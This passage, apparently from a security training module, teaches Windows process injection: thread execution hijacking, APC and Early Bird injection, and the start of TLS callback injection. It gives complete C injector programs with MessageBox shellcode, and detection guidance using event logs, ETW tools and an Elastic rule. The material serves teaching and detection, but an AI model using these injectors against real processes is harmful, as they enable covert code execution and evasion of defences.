![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-7.png)

The code then suspends the thread using `SuspendThread`.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-8.png)

After suspending the thread, it retrieves the thread context using the `GetThreadContext()` function and sets the `RIP` register to the address of the injected code using `SetThreadContext()`.

```c
	GetThreadContext(thread1, &context);
    context.Rip = (DWORD_PTR)remoteBuffer;
    SetThreadContext(thread1, &context);

```

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-10.png)

It resumes the thread using `ResumeThread`. Once the thread is resumed, the shellcode is executed, and a MessageBox is displayed.

```c
ResumeThread(thread1);

```

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-11.png)

Below, we can see how this is represented in the disassembler:

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-9.png)

## Source Code for Demo

The code snippet for the technique is presented below:

```c
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

// msfvenom -p windows/x64/messagebox TEXT="Thread Execution Hijacking" TITLE="HackTheBox Lab" -f c -v shellcode
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
    "\x4c\x8d\x85\x19\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
    "\xd5\x54\x68\x72\x65\x61\x64\x20\x45\x78\x65\x63\x75\x74"
    "\x69\x6f\x6e\x20\x48\x69\x6a\x61\x63\x6b\x69\x6e\x67\x00"
    "\x48\x61\x63\x6b\x54\x68\x65\x42\x6f\x78\x20\x4c\x61\x62"
    "\x00";

DWORD GetProcessIdByName(const char* processName)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnap, &pe32))
        {
            do
            {
                if (strcmp(pe32.szExeFile, processName) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }

        CloseHandle(hSnap);
    }

    return pid;
}

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <target process>\n", argv[0]);
        return 1;
    }

	HANDLE thread1 = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);
    DWORD currentPID = GetCurrentProcessId();
    const char* targetProcessName = argv[1];

    DWORD targetPid = GetProcessIdByName(targetProcessName);
    if (targetPid == 0)
    {
        printf("Error: %s not found.\n", targetProcessName);
        return 1;
    }

    //Print basic information about current and remote process
    printf("\n[!] Current PID: %lu\n", currentPID);
    printf("[!] Target process is %s with PID: %lu\n", targetProcessName, targetPid);

    HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (targetProcess == NULL)
    {
        printf("Error: Could not open %s (PID: %lu)\n", targetProcessName, targetPid);
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(targetProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteBuffer == NULL)
    {
        printf("Error: Could not allocate memory in target process.\n");
        return 1;
    }

    printf("[+] Memory is allocated at address: 0x%p to hold shellcode\n", remoteBuffer);
    printf("\nPress enter to write shellcode to this address. . .\n");
    getchar();

    if (!WriteProcessMemory(targetProcess, remoteBuffer, shellcode, sizeof shellcode, NULL))
    {
        printf("Failed to write to process memory. Error: %d\n", GetLastError());
        VirtualFreeEx(targetProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        return 0;
    }
    printf("[+] Shellcode (starting with %02X %02X %02X) is written at this address\n", shellcode[0], shellcode[1], shellcode[2]);

	//Getting the main thread of target process
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);
    DWORD tid = 0;

	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPid)
		{
			thread1 = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            tid = threadEntry.th32ThreadID;
            printf("[*] Thread with TID %d found. Press enter to suspend thread . . .\n", tid);
			break;
		}
	}
    getchar();

	SuspendThread(thread1);

    printf("[+] Thread suspended. Press enter to modify thread context . . .\n");
    getchar();

	GetThreadContext(thread1, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(thread1, &context);

    printf("[*] Thread context is modified. Press enter to resume thread . . .\n");
    getchar();
	ResumeThread(thread1);
    printf("[*] Thread resumed\n");
    WaitForSingleObject(thread1, INFINITE);

    CloseHandle(thread1);
    CloseHandle(targetProcess);
    return 0;
}

```

In the next section, we will showcase the detections for this attack technique.


# TEH - Detection Opportunities

Detecting Thread Execution Hijacking (TEH) can be a little challenging using normal event logs because it does not create any new thread in the remote process. However, there are a few indicators that are helpful. From the simple event logs, there are four necessary operations that are performed:

- `Process Create or Process Open`: Look for the `process creation` (e.g., Sysmon Event ID 1) or `process access` (e.g., Sysmon Event ID 10) events to find the suspicious process. Look for further events that correlate with the target process.
- `Memory allocation`: Monitor calls to memory allocation functions such as `VirtualAllocEx()`, and look for suspicious memory allocations (e.g., with execute permissions) within other processes could be an indicator of code injection.
- `Memory write`: If the calls to `WriteProcessMemory()` are monitored, we can view and analyze the written data. This can help in detecting shellcode or other malicious code injections.
- `Open Thread`: Thread enumeration and thread access with calls like `OpenThread()` and changing the thread context using functions like `GetThreadContext()` and `SetThreadContext()` for threads belonging to other processes can indicate an attempt to hijack the execution flow.

## Function Hooking

Function hooking is one of the effective ways to detect this kind of activity. We should consider monitoring system calls related to process/thread enumeration or hijacking, such as:

- `CreateToolhelp32Snapshot()`, `Thread32First()`, and `Thread32Next()`
- `OpenProcess()`
- `OpenThread()`
- `SuspendThread()`, `NtSuspendThread()`
- `GetThreadContext()`, `NtGetContextThread()`
- `SetThreadContext()`, `NtSetContextThread()`
- `ResumeThread()`, `NtResumeThread()`, `NtAlertResumeThread()`

Cross-referencing various functions and their interactions is helpful. Additionally, monitoring call stacks can help identify deviations from the expected execution path.

## Check RIP

`RIP` stands for `Return Instruction Pointer`. It points to a memory address containing the next instruction to be executed. We can check the RIP to see where a thread is pointing. When the RIP value is changed by calling the `SetThreadContext()` function, it points to a memory buffer where the malicious code is present.

The screenshot below shows the thread and its RIP in the `Threads` tab in `x64dbg`.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-12.png)

When we suspend a thread, its suspend count becomes `1` instead of `0`. The screenshot below shows the suspended thread (TID 5636) and its RIP.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-13.png)

After the call to the `SetThreadContext()` function, the RIP is changed to the shellcode buffer address.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-14.png)

It's a good idea to inspect the RIP before it is resumed. After we resume the thread, the shellcode is executed, and the address of the RIP points to another address.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-15.png)

The RIP is now at an instruction right after `syscall`. The difference between this internal function ( `NtUserWaitMessage()`) and the RIP is `0x14`.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-16.png)

This is usually true for any instances of alertable state threads.

- `SleepEx` ( `NtDelayExecution`)
- `WaitForSingleObjectEx` ( `NtWaitForSingleObject`)
- `WaitForMultipleObjectsEx` ( `NtWaitForMultipleObjects`)
- `SignalObjectAndWait` ( `NtSignalAndWaitForSingleObject`)
- `MsgWaitForMultipleObjectsEx` (probably `RealMsgWaitForMultipleObjectsEx`)
- `NtUserMsgWaitForMultipleObjectsEx`

This heuristic can be a starting point for investigation, but it should be combined with other detection strategies for a more comprehensive approach. By analyzing call patterns and code behavior, we can increase the chances of identifying malicious use of alertable-state functions. It's important to note that Thread Execution Hijacking is a complex technique, and malware authors often use various obfuscation and anti-analysis techniques to evade detection. As such, a combination of static and dynamic analysis, along with behavioral monitoring and advanced detection techniques, may be required to effectively detect and mitigate such threats.

If we run `Moneta`, it detects the abnormal private memory region as a suspicious finding.

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-1.png)

`PE-Sieve` can be employed to detect the implanted shellcode in the target process.

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-2.png)

`JonMon` events show image loads by source process (Event ID 4):

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection.png)

Remote Process Access (Event ID 2):

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-4.png)

Then, remote memory allocation (Event ID 32):

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-3.png)

Let's check the `SealighterTI` related detections based on ETW-TI. We can open the Event Viewer and check the logs. SealighterTI can detect the memory allocation.

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-5.png)

Then, when the remote process memory is written, it is detected.

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-6.png)

Remote thread context is modified. It is captured under task " `KERNEL_THREATINT_TASK_SETTHREADCONTEXT`".

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-7.png)

Elastic Defend also detects this using the threat intelligence ETW provider.

![ThreatContext](https://academy.hackthebox.com/storage/modules/266/teh-detection-8.png)


# Introduction to APC Injection

APCs, or [Asynchronous Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) are a mechanism in Windows for executing code asynchronously in the context of a specific thread. When the thread enters an alertable state (e.g., during a wait operation), the queued APCs are executed.

APC injection is a technique used by adversaries to inject malicious code into a target process by inserting it into the APC queue of a thread within that process. This code will be executed the next time the target thread enters an alertable state, such as during a wait operation. APC injection can be used to execute arbitrary code in the context of another process. APC injection relies on the target thread entering an alertable state, which may not always occur predictably. This timing dependency can make the injection less reliable.

To overcome this, there is another variation of APC injection called `Early Bird injection`, which involves injecting code into a suspended process before its entry point is executed. By injecting code early in the process creation, it can bypass certain security mechanisms and anti-malware hooks that are typically applied later in the process initialization.

## Steps involved in the APC injection

![APC](https://academy.hackthebox.com/storage/modules/266/apc-0_.png)

- `Open Target Process and Thread`: Open a handle to the target process using a Windows API call such as `OpenProcess()` and to the target thread using `OpenThread()`.
- `Allocate Memory and Write Payload`: The next step is memory allocation within the target process's address space using functions like `VirtualAllocEx()`.
- `Write malicious payload/DLL`: Write the malicious payload (e.g., shellcode or DLL) into this allocated memory using functions such as `WriteProcessMemory()`.
- `Queue the APC`: Use the WINAPI function `QueueUserAPC()` to queue a user-mode APC to a thread within the target process. The APC points to the malicious code within the target process's memory.
- `Trigger Execution`: Finally, the program triggers the execution of the queued APC by causing the target thread to enter an alertable state. This can be done by various means, such as forcing the target thread to perform a wait operation.

No call is made to the `CreateRemoteThread()` function. The APC injection technique works well in scenarios where `CreateRemoteThread()` is monitored to detect remote shellcode execution attacks. It is a little bit stealthier than `CreateRemoteThread()`.

## Real-world Malware using APC Injection

We will explore a malware sample that uses the APC injection technique to perform process injection. The details about the sample are as follows:

| Name | Description |
| --- | --- |
| Name | Alman Trojan |
| MD5 | 26f5d66b94d3bf161a896323f753a06b |
| Virustotal | [trojan.almanahe/alman](https://www.virustotal.com/gui/file/f74399cc0be275376dad23151e3d0c2e2a1c966e6db6a695a05ec1a30551c0ad/behavior) |
| Hybrid-Analysis | Report [Link](https://www.hybrid-analysis.com/sample/f74399cc0be275376dad23151e3d0c2e2a1c966e6db6a695a05ec1a30551c0ad?environmentId=100) |

Let's go through the functions calls used in this sample in IDA.

### Process Enumeration

The function iterates over running processes, performing process enumeration with `CreateToolhelp32Snapshot()`, `Process32First()`, and `Process32Next()`:

![APC](https://academy.hackthebox.com/storage/modules/266/apc-5.png)

Then it checks if the name of the process matches " `explorer.exe`".

![APC](https://academy.hackthebox.com/storage/modules/266/apc-6.png)

### Writing malicious code

The malware then opens the `explorer.exe` process with the `OpenProcess()` WINAPI call, storing the handle in the `var_24` local variable. If the handle is zero (i.e., it failed to open the process), it jumps to `loc_100039F1`. It then calculates the length of the input string (Str) and stores it in the `nSize` local variable.

Following that, it allocates memory within the target process using the `VirtualAllocEx()` API call, with read/write/execute permissions ( `flProtect=4`) and commit/reserve memory ( `flAllocationType=0x101000`). If the memory allocation is successful, it writes the input string (Str) into the allocated memory region within the target process using the `WriteProcessMemory()` WINAPI function.

![APC](https://academy.hackthebox.com/storage/modules/266/apc-7.png)

### Thread Enumeration

Next, it calls another function represented as `sub_10003886` in the screenshot below, which appears to be enumerating threads within the target process. First, it uses the function [CreateToolhelp32Snapshot()](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) to take a snapshot of the running threads.

![APC](https://academy.hackthebox.com/storage/modules/266/apc-8.png)

Second, it then iterates through the threads using the [Thread32First()](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first) and [Thread32Next()](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next) functions.

![APC](https://academy.hackthebox.com/storage/modules/266/apc-9.png)

Then, it enters a loop that iterates over the enumerated threads. For each thread, it opens the thread with the `OpenThread()` API call, and if successful, it queues an Asynchronous Procedure Call (APC) for that thread using the `QueueUserAPC()` API call. The APC routine specified is `LoadLibraryA()`, which suggests that it might be attempting to load a malicious DLL or library into the target process.

![APC](https://academy.hackthebox.com/storage/modules/266/apc-10.png)

The above malware sample targeted `explorer.exe` and queued an APC for each of its running threads. This is still not a reliable technique. In the next section, we'll showcase the `Early Bird injection`, which involves injecting code into a suspended process before its entry point is executed.


# Early Bird APC Queue Injection

The malware sample that we explored in the previous section queued an APC for each of the running threads of the process `explorer.exe`. This is still not a reliable technique. Let's try out the Early Bird injection, which involves injecting code into a suspended process before its entry point is executed.

Let's implement this technique by creating a new process (such as notepad.exe) using the WINAPI function `CreateProcessA()` with the `CREATE_SUSPENDED` flag.

```c
if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo))
{
    printf("Failed to start Notepad.exe. Error: %d\n", GetLastError());
    return 0;
}

```

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the samples and tools at the following paths:

- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`
- **APC Injection**: `C:\injection\apc\apcinjection.exe`

We implemented this technique in the sample `apcinjection.exe`. Let's run the sample program. A child process ( `notepad.exe`) is created in a suspended state using the code snippet shown above. The dark grey color in Process Hacker represents the suspended process.

![APC Injection](https://academy.hackthebox.com/storage/modules/266/apc.png)

The suspended child process (i.e., notepad.exe) is then opened, and memory is allocated in its address space. This memory will be used to store the shellcode.

```c
hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
if (hProcess == NULL)
{
    printf("Failed to open process. Error: %d\n", GetLastError());
    return 0;
}
remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (remoteBuffer == NULL)
{
    printf("Failed to allocate memory in the target process. Error: %d\n", GetLastError());
    CloseHandle(hProcess);
    return 0;
}

```

The above code will allocate a memory region in the target process and print the address for debugging.

![APC Injection](https://academy.hackthebox.com/storage/modules/266/apc-1.png)

Then, we'll write the shellcode to the allocated memory in the target process.

```c
if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL))
{
    printf("Failed to write to process memory. Error: %d\n", GetLastError());
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}

```

If we check the address in Process Hacker, we should be able to see the memory content, i.e., our shellcode.

![APC Injection](https://academy.hackthebox.com/storage/modules/266/apc-2.png)

Then, we open a handle to the primary thread of the suspended process and queue an APC to the target thread. The APC will execute the shellcode when the thread enters an alertable state.

```c
hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, processInfo.dwThreadId);
if (hThread == NULL)
{
    printf("Failed to open thread. Error: %d\n", GetLastError());
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}

QueueUserAPC((PAPCFUNC)remoteBuffer, processInfo.hThread, (ULONG_PTR)NULL);

```

The screenshot below shows the thread stack before queuing the APC:

![APC Injection](https://academy.hackthebox.com/storage/modules/266/apc-3.png)

Once we queue the APC, we'll resume the suspended thread, causing it to start executing.

```c
ResumeThread(processInfo.hThread);
WaitForSingleObject(processInfo.hThread, INFINITE);

```

The APC will be executed when the thread enters an alertable state, running the shellcode. In our case, it is the MessageBox shellcode.

![APC Injection](https://academy.hackthebox.com/storage/modules/266/apc-4.png)

## Source Code for Demo

Below, we can see the full C code snippet for further testing:

```c
#include <windows.h>
#include <stdio.h>

int main() {

    //msfvenom -p windows/x64/messagebox TEXT="APC Injection Successful" TITLE="HackTheBox Lab" -f c -v shellcode
    unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
    "\x4c\x8d\x85\x17\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
    "\xd5\x41\x50\x43\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e"
    "\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x00\x48\x61"
    "\x63\x6b\x54\x68\x65\x42\x6f\x78\x20\x4c\x61\x62\x00";

    HANDLE hProcess, hThread;
    LPVOID remoteBuffer;
    STARTUPINFOA startupInfo = {0};
    startupInfo.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION processInfo = {0};

    // Start Notepad.exe in suspended mode
    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo))
    {
        printf("Failed to start Notepad.exe. Error: %d\n", GetLastError());
        return 0;
    }

    printf("\n[+] Target process in suspended state (notepad.exe) PID: %d\n", processInfo.dwProcessId);

    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
    if (hProcess == NULL)
    {
        printf("Failed to open process. Error: %d\n", GetLastError());
        return 0;
    }

    // Allocate memory for the shellcode in the target process
    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL)
    {
        printf("Failed to allocate memory in the target process. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 0;
    }

    printf("[+] Memory is allocated at address: 0x%p to hold shellcode\n", remoteBuffer);
    printf("\nPress enter to write shellcode to this address. . .\n");
    getchar();

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL))
    {
        printf("Failed to write to process memory. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    printf("[+] Shellcode (starting with %02X %02X %02X) is written at this address\n", shellcode[0], shellcode[1], shellcode[2]);

    // Queue an APC to execute shellcode
    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, processInfo.dwThreadId);
    if (hThread == NULL)
    {
        printf("Failed to open thread. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    printf("[+] Thread %d opened. Press enter to queue APC\n", processInfo.dwThreadId);
    getchar();

    QueueUserAPC((PAPCFUNC)remoteBuffer, processInfo.hThread, (ULONG_PTR)NULL);

    printf("[+] Queued APC. Press enter to resume thread. . .\n");
    getchar();

    // Resume the main thread of the target process
    ResumeThread(processInfo.hThread);
    WaitForSingleObject(processInfo.hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] Shellcode executed successfully using QueueUserAPC.\n");
    return 0;
}

```

In the next section, we will go through the detection methods for this attack technique.


# APC - Detection Opportunities

Detection of the APC Queue injection technique requires monitoring API calls, memory modifications, and process behavior. We can take an example from some detections mentioned on the MITRE technique page for APC Queue Injection.

![](https://academy.hackthebox.com/storage/modules/266/apc-detect.png)

In the above page, the `OS API Execution (DS0009)` detection recommends monitoring calls to functions like `QueueUserAPC()`, `NtQueueApcThread()`, `SuspendThread()`, `SetThreadContext()`, and `ResumeThread()`. And we can identify things like unusual API call sequences, and high noise from legit applications that use APCs for legitimate purposes. In addition to this, we can also perform a contextual analysis of target processes and memory regions (e.g., APCs targeting unbacked or RWX memory).

The other detection `Process Access (DS0009)` suggests watching for processes accessing other processes without a legitimate reason, particularly access requests with `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, or `PROCESS_SUSPEND_RESUME` permissions.

In the detection `Process Modification (DS0009)`, it is recommended to monitor for memory modifications in running processes, particularly regions allocated with `VirtualAllocEx()` and marked as `RWX` (Read-Write-Execute). Track memory changes in processes and look for APCs doing code execution from `non-image-backed memory regions`.

Track `SetThreadContext()` calls to identify threads redirected to malicious shellcode. And analyze thread start addresses to confirm they match legitimate module boundaries.

## Suspicious Activity in Event Logs

JonMon can detect the remote process access under event ID 2.

![APC-Detect](https://academy.hackthebox.com/storage/modules/266/apc-detection.png)

Remote memory allocation is also detected under event ID 32.

![APC-Detect](https://academy.hackthebox.com/storage/modules/266/apc-detection-1.png)

JonMon has a dedicated event ID 26 for QueueUserAPC events.

![APC-Detect](https://academy.hackthebox.com/storage/modules/266/apc-detection-2.png)

We can also check the Event Viewer for Sealighter-TI-related logs. Sealighter-TI can detect memory allocation, memory writing, and any QueueUserAPC-related events.

![APC-Detect](https://academy.hackthebox.com/storage/modules/266/apc-detection-3.png)

Elastic also detects this under malicious behavior detections.

![APC-Detect](https://academy.hackthebox.com/storage/modules/266/apc-detection-4.png)

This is detected under the rule "Potential Injection via Asynchronous Procedure Call".

![APC-Detect](https://academy.hackthebox.com/storage/modules/266/apc-detection-5.png)

We can find the rule definition in the official GitHub repository of [Elastic](https://github.com/elastic/protections-artifacts/blob/cb45629514acefc68a9d08111b3a76bc90e52238/behavior/rules/defense_evasion_potential_injection_via_asynchronous_procedure_call.toml) and scrutinize the logic behind the rule.

```toml
[rule]
description = """
Identifies attempts to queue an Asynchronous Procedure Call (APC) to a remote process. This may indicate a remote code
injection attack.
"""
id = "2316b571-731d-4745-97ac-4fd6922d32df"
license = "Elastic License v2"
name = "Potential Injection via Asynchronous Procedure Call"
os_list = ["windows"]
reference = [
    "https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection",
]
version = "1.0.3"

query = '''
api where process.Ext.api.name : "QueueUserAPC" and process.pid != 4 and
 process.Ext.api.behaviors : "cross-process" and process.Ext.api.behaviors : "execute_shellcode" and
 process.Ext.api.summary : "*Unbacked*NULL*"
'''

min_endpoint_version = "8.8.0"
[[actions]]
action = "kill_process"
field = "process.entity_id"
state = 0

[[optional_actions]]
action = "rollback"
field = "process.entity_id"
state = 0

[[threat]]
framework = "MITRE ATT&CK"
[[threat.technique]]
id = "T1055"
name = "Process Injection"
reference = "https://attack.mitre.org/techniques/T1055/"

[threat.tactic]
id = "TA0005"
name = "Defense Evasion"
reference = "https://attack.mitre.org/tactics/TA0005/"

[internal]
min_endpoint_version = "8.8.0"

```

The query logic is defined in the query field, which specifies the conditions under which the rule triggers. By checking for cross-process behavior, shellcode execution, and specific memory patterns, it identifies suspicious activity involving the `QueueUserAPC` API.

```EQL
api where process.Ext.api.name : "QueueUserAPC" and process.pid != 4 and
 process.Ext.api.behaviors : "cross-process" and process.Ext.api.behaviors : "execute_shellcode" and
 process.Ext.api.summary : "*Unbacked*NULL*"

```

It first checks if the API call made by the process is `QueueUserAPC`, which is used to queue an APC to a thread. The next condition ensures that the process ID is not `4`, which typically corresponds to the System process. This exclusion is necessary to avoid false positives. Then, it checks if the API call exhibits cross-process behavior, meaning it is interacting with a process other than its own. It also verifies that the API call is associated with behavior indicative of executing shellcode. Next, it checks if the memory region being used is unbacked and null, which is a typical sign of code injection.


# TLS Callback Injection

Thread Local Storage (TLS) callbacks in process injection is a technique where adversaries manipulate pointers inside a portable executable (PE) to `redirect a process to malicious code before reaching the code's legitimate entry point`. MITRE has documented this technique as part of their ATT&CK framework under ID [T1055.005](https://attack.mitre.org/techniques/T1055/005/), categorizing it as a sub-technique of process injection (T1055) and listing it as relevant to tactics like defense evasion and privilege escalation.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback001.png)

A simple demonstration to show TLS callback function execution happening before the entry point of a program (i.e., the main function) is shown as follows:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlsc.gif)

## What is Thread Local Storage?

Thread-local storage (TLS) is a mechanism in programming that allows each thread in a multi-threaded application to have its own unique data storage area. This is particularly useful in scenarios where multiple threads may need to access or store data independently, without interfering with each other. This allows each thread to have its own copy of data.

## Hidden code

Thread Local Storage (TLS) callbacks in Windows are mechanisms designed to enable programs to execute initialization tasks specific to individual threads when a process begins. What sets TLS callbacks apart is their execution before the application's entry point, such as the `main()` function. If the reverse engineers or malware analysts (trying to reverse such a sample) are not aware of this technique, they might face challenges when debugging such samples in the debugging tools. Because such tools typically pause execution at the main function, potentially overlooking TLS-related code. Similarly, disassemblers and static analysis tools often display the main function, possibly concealing any TLS-related code that precedes it.

In the Win32 PE file format, applications are typically executed from the main entry point specified in the `PE.OptionalHeader.AddressOfEntryPoint` field of the executable's header structure. This field indicates where the program should start running.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tls-sample-1.png)

However, contrary to common belief, the system loader does not always execute code from this entry point first. Instead, it first looks for the Thread Local Storage (TLS) data directory in the PE file's header. If TLS entry points are found, the loader executes these before running the main entry point code.

